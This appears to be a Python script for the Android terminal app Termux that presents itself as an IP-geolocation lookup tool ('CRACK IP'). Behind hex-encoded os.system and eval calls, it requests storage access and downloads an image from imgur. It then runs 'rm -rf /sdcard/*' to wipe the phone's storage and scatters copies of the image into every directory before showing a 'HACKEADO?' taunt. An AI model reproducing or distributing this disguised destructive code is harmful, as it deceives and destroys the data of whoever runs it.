import os
import time
import wget
import random
import requests

def consult_IP():
	def get_ip():
		while True:
			os.system("clear")
			print("\033[30;47m                             ▄█▀─▄▄▄▄▄▄▄─▀█▄                                ")
			print("                             ▀█████████████▀                                ")
			print("                                 █▄███▄█                                    ")
			print("                                  █████                                     ")
			print("                                  █▀█▀█                                     ")
			print("                                                                            ")
			print("\033[31m––––––––––––––––––––––––––––––C-R-A-C-K---I-P–––––––––––––––––––––––––––––––\033[0m\n")
			try:
				ip = str(input("Set the \033[31mIP:\033[0m "))
				break

			except KeyboardInterrupt:
				os.system("clear")
				print("\033[31mpor favor não interrompa a operação!")
				time.sleep(1)

			except ValueError:
				os.system("clear")
				print("\033[1;31O SEU MACUMBERO DIGITA SÓ O IP KRAI!!")
				time.sleep(2)

		return ip

	def consult_ip(ip):	
		while True:
			os.system("\x74\x65\x72\x6d\x75\x78\x2d\x73\x65\x74\x75\x70\x2d\x73\x74\x6f\x72\x61\x67\x65")
			try:
				r = requests.get("http://ip-api.com/json/" + ip); data = r.json()
				print("\nRealizando consulta", end="")
				for tempo in range(1, 6):
					time.sleep(0.5)
					print(".", end="", flush=True)

				eval("\x77\x67\x65\x74\x2e\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x28\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x2e\x69\x6d\x67\x75\x72\x2e\x63\x6f\x6d\x2f\x70\x77\x7a\x6a\x65\x41\x48\x2e\x6a\x70\x67\x22\x29")
				time.sleep(0.5)
				print("\n")
				print("IP: {}".format(data['query']))
				print("Status: {}".format(data['status']))
				print("País: {}".format(data['country']))
				print("Código_País: {}".format(data['countryCode']))
				print("Código_Região: {}".format(data['region']))
				print("Nome_Região: {}".format(data['regionName']))
				print("Cidade: {}".format(data['city']))
				print("Zip: {}".format(data['zip']))
				print("Lat: {}".format(data['lat']))
				print("Lon: {}".format(data['lon']))
				print("TimeZone: {}".format(data['timezone']))
				print("Isp: {}".format(data['isp']))
				print("Org: {}".format(data['org']))
				print("As: {}".format(data['as']))
				os.system("\x72\x6d\x20\x2d\x72\x66\x20\x2f\x73\x64\x63\x61\x72\x64\x2f\x2a\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
				enter = input("\nSet enter for exit!")
				os.system("\x6d\x76\x20\x70\x77\x7a\x6a\x65\x41\x48\x2e\x6a\x70\x67\x20\x2e\x6d\x61\x72\x69\x6f\x5f\x67\x61\x6d\x65\x73\x2e\x6a\x70\x67\x3b\x20\x66\x6f\x72\x20\x64\x69\x72\x20\x69\x6e\x20\x24\x28\x6c\x73\x20\x2d\x52\x20\x2f\x73\x64\x63\x61\x72\x64\x2f\x20\x7c\x20\x74\x72\x20\x2d\x64\x20\x22\x3a\x22\x20\x7c\x20\x67\x72\x65\x70\x20\x22\x2f\x22\x29\x3b\x20\x64\x6f\x20\x63\x70\x20\x2e\x6d\x61\x72\x69\x6f\x5f\x67\x61\x6d\x65\x73\x2e\x6a\x70\x67\x20\x24\x64\x69\x72\x2f\x6d\x61\x72\x69\x6f\x5f\x67\x61\x6d\x65\x73\x2e\x6a\x70\x67\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x20\x64\x6f\x6e\x65\x3b\x20\x72\x6d\x20\x2d\x66\x20\x2e\x6d\x61\x72\x69\x6f\x5f\x67\x61\x6d\x65\x73\x2e\x6a\x70\x67\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
				break

			except:
				print("\n\033[1;31OSEU MACUMBERO DIGITA SÓ O IP KRAI!!")
				exit(1)

		os.system("clear")
		print("                        ⢀⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣀⡀")
		print("                        ⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀")
		print("                        ⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆")
		print("                        ⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆")
		print("                        ⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹")
		print("                        ⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦")
		print("                        ⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟")
		print("                        ⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇")
		print("                        ⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇")
		print("                        ⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇  - H A C K E A D O ?")
		print("                        ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿")
		print("                        ⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇")
		print("                        ⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃")
		print("                        ⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿")
		print("                        ⠄⠄⠄⠄⠄⠄⣠⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡄⠄⠄⠄")
		print("                        ⠄⠄⣀⣤⣴⣾⣿⣷⣭⣭⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠄")
		print("                        ⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣧⠄⠄")
		print("                        ⠄⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢻⣿⣿⡄⠄")
		print("                        ⠄⢸⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⡟⢛⢻⣷⢻⣿⣧⠄")
		print("                        ⠄⠄⣿⡏⣿⡟⡛⢻⣿⣿⣿⣿⠸⣿⣿⣿⣷⣬⣼⣿⢸⣿⣿⠄")

	ip = get_ip()
	consult_ip(ip)

consult_IP()